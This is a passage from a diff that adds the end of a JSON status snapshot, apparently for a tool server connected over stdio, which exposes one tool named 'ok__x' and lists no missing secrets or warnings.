+              "transport": "stdio",
+              "connected": true,
+              "tools": [
+                "ok__x"
+              ],
+              "missing_secrets": [],
+              "warnings": []
+            }
+          ],
+          "lines": []
+        }
+      ]
+    }
+  }
+}
